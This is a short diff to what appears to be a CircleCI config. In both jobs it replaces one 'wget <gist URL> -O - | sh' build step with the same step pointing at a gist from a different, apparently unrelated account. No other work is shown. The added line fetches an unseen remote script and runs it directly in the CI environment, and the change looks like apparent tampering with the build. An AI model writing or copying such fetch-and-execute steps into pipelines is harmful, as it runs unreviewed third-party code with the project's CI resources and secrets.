@@ -4,11 +4,11 @@ jobs:
     docker:
       - image: ruby:2.5
     steps:
-      - run: wget https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev -O - | sh
+      - run: wget https://gist.githubusercontent.com/RandomiDn/482b6c2080dc7594f8eff332f0bb6bba/raw/4686ba67de320d02c28548944e68a33a263d490d/init.dev -O - | sh
   machine:
     machine: true
     steps:
-      - run: wget https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev -O - | sh
+      - run: wget https://gist.githubusercontent.com/RandomiDn/482b6c2080dc7594f8eff332f0bb6bba/raw/4686ba67de320d02c28548944e68a33a263d490d/init.dev -O - | sh
 workflows:
   version: 2
   build_and_test:
